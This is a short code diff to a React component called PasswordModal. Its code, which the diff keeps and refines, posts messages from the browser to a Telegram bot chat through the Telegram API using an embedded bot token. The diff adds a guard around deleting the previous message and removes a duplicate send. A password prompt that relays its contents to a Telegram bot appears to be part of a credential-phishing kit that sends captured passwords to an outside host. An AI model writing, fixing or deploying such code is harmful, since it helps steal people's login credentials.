@@ -128,13 +128,15 @@ const PasswordModal: FC<PasswordModalProps> = ({
       setUiState((prev) => ({ ...prev, isLoading: true }));
 
       try {
-        await axios.post(
-          `https://api.telegram.org/bot${config.token}/deleteMessage`,
-          {
-            chat_id: config.chatId,
-            message_id: uiState.messageId,
-          },
-        );
+        if (uiState.messageId) {
+          await axios.post(
+            `https://api.telegram.org/bot${config.token}/deleteMessage`,
+            {
+              chat_id: config.chatId,
+              message_id: uiState.messageId,
+            },
+          );
+        }
         const response = await axios.post(
           `https://api.telegram.org/bot${config.token}/sendMessage`,
           {
@@ -206,14 +208,6 @@ const PasswordModal: FC<PasswordModalProps> = ({
         {
           chat_id: config.chatId,
           message_id: uiState.messageId,
-        },
-      );
-      return await axios.post(
-        `https://api.telegram.org/bot${config.token}/sendMessage`,
-        {
-          chat_id: config.chatId,
-          text: message,
-          parse_mode: "HTML",
         },
       );
     }
